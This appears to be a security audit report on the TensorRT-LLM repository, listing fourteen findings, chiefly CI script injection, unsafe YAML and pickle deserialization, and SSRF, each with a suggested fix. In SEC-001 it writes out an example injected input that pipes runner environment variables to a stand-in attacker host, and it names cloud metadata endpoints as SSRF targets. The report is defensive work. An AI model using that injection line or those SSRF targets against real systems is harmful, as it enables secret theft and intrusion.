# TensorRT-LLM Security Audit Report

**Date:** 2026-03-09
**Scope:** Full repository — source code, CI/CD pipelines, GitHub Actions workflows
**Branch audited:** `main`

---

## Executive Summary

This audit identified **14 distinct security findings** across five risk categories, ranging from
Critical to Low severity.  The most severe issues are:

1. **CI/CD script injection** allowing secret exfiltration and runner RCE from a crafted
   `workflow_dispatch` input.
2. **Unauthenticated ZMQ pickle deserialization** on a socket bound to `0.0.0.0`, allowing
   any network peer to achieve RCE against the inference server.
3. **Unsafe `yaml.load()` with `yaml.Loader`** in CI test infrastructure, enabling RCE via
   a malicious test-list file.
4. **Supply-chain attack surface** through unpinned `@main` / `@dist` GitHub Actions.
5. **SSRF** via unvalidated image URLs in multimodal inference.

---

## Findings Summary

| ID | Severity | Category | File(s) | PoC |
|----|----------|----------|---------|-----|
| [SEC-001](#sec-001) | **CRITICAL** | CI/CD Injection | `.github/workflows/l0-test.yml:56` | `poc_001_cicd_script_injection.md` |
| [SEC-002](#sec-002) | **CRITICAL** | Unsafe YAML Deserialisation | `tests/integration/defs/test_list_validation.py:52` | `poc_002_yaml_unsafe_load_rce.py` |
| [SEC-003](#sec-003) | **CRITICAL** | Pickle RCE / Unauth ZMQ | `tensorrt_llm/llmapi/visual_gen.py:70-71` + `executor/ipc.py:367` | `poc_003_zmq_unauthenticated_pickle_rce.py` |
| [SEC-004](#sec-004) | **HIGH** | SSRF | `runtime/multimodal_model_runner.py:2181` + `inputs/utils.py:136` | `poc_004_ssrf_multimodal_image_url.py` |
| [SEC-005](#sec-005) | **HIGH** | Supply Chain | `.github/workflows/blossom-ci.yml:391` + `l0-test.yml:59` | `poc_005_supply_chain_unpinned_actions.md` |
| [SEC-006](#sec-006) | **HIGH** | Secret Exposure | `.github/workflows/l0-test.yml:56` | — |
| [SEC-007](#sec-007) | **HIGH** | Arbitrary Code Execution | `tensorrt_llm/quantization/quantize_by_modelopt.py` (20 occurrences) | — |
| [SEC-008](#sec-008) | **MEDIUM** | Pickle in Distributed MPI | `tensorrt_llm/_torch/distributed/communicator.py:319,328,442` | — |
| [SEC-009](#sec-009) | **MEDIUM** | Pickle in Python Plugin | `tensorrt_llm/python_plugin.py:495` | — |
| [SEC-010](#sec-010) | **MEDIUM** | Tar Path Traversal | `.github/workflows/l0-test.yml:56` | — |
| [SEC-011](#sec-011) | **MEDIUM** | `shell=True` Command Injection | `scripts/build_wheel.py`, `examples/models/contrib/stdit/utils.py` | — |
| [SEC-012](#sec-012) | **MEDIUM** | No Artifact Checksum | `scripts/get_wheel_from_package.py:52-55` | — |
| [SEC-013](#sec-013) | **LOW** | Race Condition (`mktemp`) | `tests/unittest/others/test_builder.py:60` | — |
| [SEC-014](#sec-014) | **LOW** | XXE-Adjacent XML Parsing | `jenkins/scripts/test_rerun.py`, `tests/integration/defs/cpp/cpp_common.py` | — |

---

## Detailed Findings

### SEC-001 — CI/CD Script Injection {#sec-001}

**Severity:** CRITICAL | **CWE:** CWE-78, CWE-74 | **PoC:** `poc_001_cicd_script_injection.md`

**Location:** `.github/workflows/l0-test.yml:56`

```yaml
run: rm -rf results && mkdir results && cd results && \
     curl --user svc_tensorrt:${{ secrets.ARTIFACTORY_TOKEN }} \
     -L ${{ github.event.inputs.test_results_url }} | tar -xz
```

The `test_results_url` workflow input is interpolated **directly into a shell command** without
sanitisation.  Any user with `workflow_dispatch` trigger rights can inject shell metacharacters.

**Example exploit:**
```
test_results_url: "http://x.com/f.tgz; env | curl -s -d @- https://evil.example.com/exfil #"
```

**Impact:** Full exfiltration of `ARTIFACTORY_TOKEN` (and all runner env vars); arbitrary
code execution on the self-hosted runner; potential lateral movement to NVIDIA internal
infrastructure.

**Fix:**
```yaml
env:
  TEST_RESULTS_URL: ${{ github.event.inputs.test_results_url }}
run: |
  if [[ ! "$TEST_RESULTS_URL" =~ ^https://urm\.nvidia\.com/ ]]; then
    echo "Blocked non-Artifactory URL" >&2; exit 1
  fi
  curl -H "Authorization: Bearer ${ARTIFACTORY_TOKEN}" -L "$TEST_RESULTS_URL" | tar -xz
```

---

### SEC-002 — Unsafe YAML Deserialisation {#sec-002}

**Severity:** CRITICAL | **CWE:** CWE-502 | **PoC:** `poc_002_yaml_unsafe_load_rce.py`

**Location:** `tests/integration/defs/test_list_validation.py:52`

```python
test_db_data = yaml.load(f, Loader=yaml.Loader)   # allows arbitrary object instantiation
```

PyYAML's full `Loader` supports `!!python/object/apply:` tags, enabling arbitrary Python
execution.  A malicious `.yml` test-list file (e.g. introduced via a supply-chain compromise
of the repo or a CI artifact) can execute code in the CI runner.

**Verified PoC output (run `poc_002_yaml_unsafe_load_rce.py`):**
```
[!] VULNERABLE: yaml.Loader executed: /tmp/poc_002_pwned.txt
[+] File /tmp/poc_002_pwned.txt contains: YAML_RCE_POC_002
[+] FIXED: SafeLoader correctly rejected the payload: ConstructorError
```

**Fix:**
```python
test_db_data = yaml.safe_load(f)   # or yaml.load(f, Loader=yaml.SafeLoader)
```

---

### SEC-003 — Unauthenticated ZMQ Pickle RCE {#sec-003}

**Severity:** CRITICAL | **CWE:** CWE-502, CWE-1327 | **PoC:** `poc_003_zmq_unauthenticated_pickle_rce.py`

**Locations:**
- `tensorrt_llm/llmapi/visual_gen.py:70-71` — socket bound to `0.0.0.0` (all interfaces)
- `tensorrt_llm/llmapi/visual_gen.py:197,203` — `use_hmac_encryption=False`
- `tensorrt_llm/_torch/visual_gen/executor.py:94,108` — `use_hmac_encryption=False`
- `tensorrt_llm/executor/ipc.py:367` — `pickle.loads(data)` without HMAC

```python
# visual_gen.py:70
self.request_queue_addr = f"tcp://0.0.0.0:{req_port}"   # all interfaces!

# visual_gen.py:197
ZeroMqQueue((self.request_queue_addr, None),
            use_hmac_encryption=False, ...)               # no auth!

# ipc.py:367
return pickle.loads(data)  # nosec B301                  # unconditional deserialise
```

When `VisualGen` (diffusion image generation) is active, it opens two TCP ZMQ sockets on
`0.0.0.0` with no authentication.  Any host that can reach the server on the network can
connect and send a malicious pickle payload that executes code with the server process's
privileges.

**Threat scenario:** Multi-tenant GPU cluster, shared VPC, or cloud instance with a
misconfigured security group.

**Fix:**
```python
# 1. Bind to loopback only
self.request_queue_addr = f"tcp://127.0.0.1:{req_port}"

# 2. Enable HMAC (already the default elsewhere in the codebase)
ZeroMqQueue((self.request_queue_addr, None),
            use_hmac_encryption=True, ...)

# 3. Long-term: replace pickle with msgpack/protobuf
```

---

### SEC-004 — SSRF via Multimodal Image URL {#sec-004}

**Severity:** HIGH | **CWE:** CWE-918 | **PoC:** `poc_004_ssrf_multimodal_image_url.py`

**Locations:**
- `tensorrt_llm/runtime/multimodal_model_runner.py:2181-2185`
- `tensorrt_llm/inputs/utils.py:136-137, 162-164`

```python
# multimodal_model_runner.py:2181
if image_path.startswith("http") or image_path.startswith("https"):
    response = requests.get(image_path, timeout=5)   # no URL validation
```

An attacker submitting an inference request with a crafted `image_path` can:
- Access internal services (`http://127.0.0.1:6379/`, Redis, Etcd, etc.)
- Steal cloud IAM credentials from metadata endpoints (`http://169.254.169.254/`)
- Perform an internal network port scan via timing

**Fix:**
```python
import ipaddress
from urllib.parse import urlparse

def _validate_image_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"Disallowed scheme: {parsed.scheme}")
    host = parsed.hostname or ""
    # Block cloud metadata endpoints
    if host in {"169.254.169.254", "metadata.google.internal", "metadata.azure.com"}:
        raise ValueError(f"SSRF: blocked metadata host {host}")
    # Block private/loopback addresses
    try:
        addr = ipaddress.ip_address(host)
        if addr.is_private or addr.is_loopback or addr.is_link_local:
            raise ValueError(f"SSRF: blocked internal address {addr}")
    except ValueError:
        pass  # it's a hostname, not an IP
```

---

### SEC-005 — Supply Chain Attack via Unpinned GitHub Actions {#sec-005}

**Severity:** HIGH | **CWE:** CWE-1357 | **PoC:** `poc_005_supply_chain_unpinned_actions.md`

**Locations:**
- `.github/workflows/blossom-ci.yml:391` — `NVIDIA/blossom-action@main`
- `.github/workflows/l0-test.yml:59` — `test-summary/action@dist`
- `.github/workflows/pr-check.yml:29` — `agenthunt/conventional-commit-checker-action@v2.0.0` (semver only)

Mutable branch refs (`@main`, `@dist`) allow a compromised upstream repository to execute
arbitrary code in CI runners that hold `BLOSSOM_KEY`, `GITHUB_TOKEN`, `ARTIFACTORY_TOKEN`,
and `CI_SERVER` secrets.

**Fix:** Pin all actions to immutable commit SHAs:
```yaml
uses: NVIDIA/blossom-action@<COMMIT_SHA>
uses: test-summary/action@<COMMIT_SHA>
```

---

### SEC-006 — Secret Exposure via `curl --user` {#sec-006}

**Severity:** HIGH | **File:** `.github/workflows/l0-test.yml:56`

```yaml
curl --user svc_tensorrt:${{ secrets.ARTIFACTORY_TOKEN }} -L ...
```

Basic auth credentials passed via `--user` appear in:
- GitHub Actions job logs (visible in the web UI before secret masking kicks in)
- The `ps` process listing on the runner during execution
- The runner's shell history

**Fix:** Use bearer token headers:
```bash
curl -H "Authorization: Bearer ${ARTIFACTORY_TOKEN}" -L ...
```

---

### SEC-007 — `trust_remote_code=True` Execution of Untrusted Model Code {#sec-007}

**Severity:** HIGH | **File:** `tensorrt_llm/quantization/quantize_by_modelopt.py` (20 occurrences)

HuggingFace's `trust_remote_code=True` allows model repositories to ship and execute
arbitrary Python at load time.  A compromised or malicious model on HuggingFace Hub would
execute code in the quantization environment.

```python
# quantize_by_modelopt.py:216
model = AutoModelForCausalLM.from_pretrained(ckpt_path, trust_remote_code=True, ...)
```

**Mitigation:** Document the risk prominently; consider requiring user opt-in with an
explicit warning rather than setting it unconditionally in library code.

---

### SEC-008 — Pickle Deserialization in MPI Distributed Broadcast {#sec-008}

**Severity:** MEDIUM | **File:** `tensorrt_llm/_torch/distributed/communicator.py:319,328,442`

```python
return pickle.loads(serialized)  # nosec B301   (safe_broadcast)
out.append(pickle.loads(blob))   # nosec B301   (safe_gather)
```

MPI data exchanged between nodes is pickled without signing.  An attacker who can inject
into MPI communication (e.g. via a compromised cluster node or network) can achieve RCE on
all ranks.

**Fix:** Use a safer serialisation format (msgpack, numpy's `npy` for tensors); or apply
HMAC signing matching the pattern used in `ipc.py`.

---

### SEC-009 — Pickle Deserialization in TensorRT Plugin Creator {#sec-009}

**Severity:** MEDIUM | **File:** `tensorrt_llm/python_plugin.py:495`

```python
plugin_dict = pickle.loads(data)  # nosec B301
```

TensorRT engine plugin fields are deserialized via pickle.  A maliciously crafted TRT
engine file (e.g. downloaded from an untrusted source) could trigger RCE on load.

**Fix:** Validate TRT engine provenance; consider replacing plugin-field serialization
with JSON.

---

### SEC-010 — Tar Path Traversal (Zip Slip) {#sec-010}

**Severity:** MEDIUM | **File:** `.github/workflows/l0-test.yml:56`

```bash
curl ... | tar -xz     # extracts into ./results/ with no path validation
```

A malicious tar archive served from an attacker-controlled URL (enabled by SEC-001) can
contain entries with `../` components that write files outside the `results/` directory —
e.g. to `~/.ssh/authorized_keys` or to overwrite runner scripts.

**Fix:**
```bash
tar --strip-components=1 -xz -C ./results/ --wildcards '*.xml' < archive.tar.gz
```
Or extract and then validate that no file falls outside the target directory.

---

### SEC-011 — `shell=True` with String Formatting {#sec-011}

**Severity:** MEDIUM | **Files:** `scripts/build_wheel.py:39`, `examples/models/contrib/stdit/utils.py:831`

```python
build_run = partial(run, shell=True, check=True)   # used throughout build_wheel.py
exit_code = subprocess.call(cmd, shell=True)        # stdit/utils.py:831
```

`shell=True` with f-string arguments creates command injection risk if any variable in the
command string is user-controlled (e.g. a model name containing a semicolon).

**Fix:** Pass commands as lists:
```python
subprocess.run(["cmake", "--build", build_dir], check=True)
```

---

### SEC-012 — Downloaded Artifacts Without Checksum Verification {#sec-012}

**Severity:** MEDIUM | **File:** `scripts/get_wheel_from_package.py:52-55`

```python
subprocess.run(["wget", "-nv", tarfile_link], check=True)
# No SHA-256 / MD5 check after download
```

An attacker performing an on-path MITM (or compromising the Artifactory server) can serve
a backdoored wheel without detection.

**Fix:**
```python
subprocess.run(["wget", "-nv", tarfile_link, "-O", local_file], check=True)
expected_sha = fetch_sha_from_manifest()
if hashlib.sha256(Path(local_file).read_bytes()).hexdigest() != expected_sha:
    raise RuntimeError("Checksum mismatch — possible tampering")
```

---

### SEC-013 — Race Condition via `tempfile.mktemp()` {#sec-013}

**Severity:** LOW | **File:** `tests/unittest/others/test_builder.py:60`

```python
builder.save_config(builder_config, tempfile.mktemp())
```

`mktemp()` returns a filename without creating the file, leaving a TOCTOU window.
Another process could create a file with the returned name before the test writes to it,
causing data corruption or a symlink attack.

**Fix:** `tempfile.NamedTemporaryFile(delete=False)` or `tempfile.mkstemp()`.

---

### SEC-014 — XML Parsing Without Explicit XXE Disablement {#sec-014}

**Severity:** LOW | **Files:** `jenkins/scripts/test_rerun.py`, `tests/integration/defs/cpp/cpp_common.py`

```python
tree = ET.parse(xml_filename)   # stdlib ElementTree
```

Python's `xml.etree.ElementTree` does not expand external entities by default (unlike
`lxml`), so current risk is low.  However, explicit hardening is best practice:

```python
# No change needed for ElementTree, but document the assumption.
# If switching to lxml, disable XXE:
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

---

## Risk Matrix

```
CRITICAL ██████ SEC-001  SEC-002  SEC-003
HIGH     ████   SEC-004  SEC-005  SEC-006  SEC-007
MEDIUM   ██     SEC-008  SEC-009  SEC-010  SEC-011  SEC-012
LOW      █      SEC-013  SEC-014
```

---

## Remediation Roadmap

### Immediate (before next release)

| Finding | Action | Effort |
|---------|--------|--------|
| SEC-001 | Sanitise `test_results_url` with env-var indirection + allowlist | 30 min |
| SEC-002 | `yaml.safe_load()` in `test_list_validation.py` | 5 min |
| SEC-003 | Bind to `127.0.0.1`; re-enable HMAC in `visual_gen.py` | 1 h |
| SEC-006 | Switch `curl` to bearer-token header auth | 15 min |

### Short-term (within 2 sprints)

| Finding | Action | Effort |
|---------|--------|--------|
| SEC-004 | Implement URL allowlist / private-IP blocker for image fetches | 2 h |
| SEC-005 | Pin all GitHub Actions to commit SHAs; add Dependabot config | 1 h |
| SEC-010 | Add `tar` path validation in CI | 30 min |
| SEC-011 | Audit `shell=True` usages; convert to list-based subprocess calls | 3 h |
| SEC-012 | Add SHA-256 verification for all downloaded artifacts | 2 h |

### Medium-term (hardening)

| Finding | Action | Effort |
|---------|--------|--------|
| SEC-007 | Add user-visible warning / opt-in flag for `trust_remote_code` | 4 h |
| SEC-008 | Replace MPI pickle with msgpack + HMAC | 1 d |
| SEC-009 | Replace plugin pickle with JSON | 4 h |
| SEC-013 | Fix `mktemp` → `mkstemp` | 5 min |
| SEC-014 | Document XXE assumptions; add parser hardening comment | 30 min |

---

## Proof of Concept Files

| PoC File | Finding(s) | Runnable |
|----------|-----------|---------|
| `security/pocs/poc_001_cicd_script_injection.md` | SEC-001 | Manual (requires GitHub API) |
| `security/pocs/poc_002_yaml_unsafe_load_rce.py` | SEC-002 | Yes — `python poc_002_yaml_unsafe_load_rce.py` |
| `security/pocs/poc_003_zmq_unauthenticated_pickle_rce.py` | SEC-003 | Yes — `python poc_003 --mode demo` |
| `security/pocs/poc_004_ssrf_multimodal_image_url.py` | SEC-004 | Yes — `python poc_004_ssrf_multimodal_image_url.py` |
| `security/pocs/poc_005_supply_chain_unpinned_actions.md` | SEC-005 | Manual (illustrative) |

---

## Methodology

1. **Static analysis** of all Python source under `tensorrt_llm/` and `scripts/` using
   `grep`/`ripgrep` for patterns: `pickle.loads`, `yaml.load`, `shell=True`, `eval(`,
   `trust_remote_code`, `0.0.0.0`, `requests.get(`.
2. **CI/CD review** of all files under `.github/workflows/` for injection points,
   unpinned actions, and secret handling anti-patterns.
3. **Manual code reading** of flagged functions to confirm exploitability and determine
   impact.
4. **PoC development** for highest-severity findings to confirm exploitability.
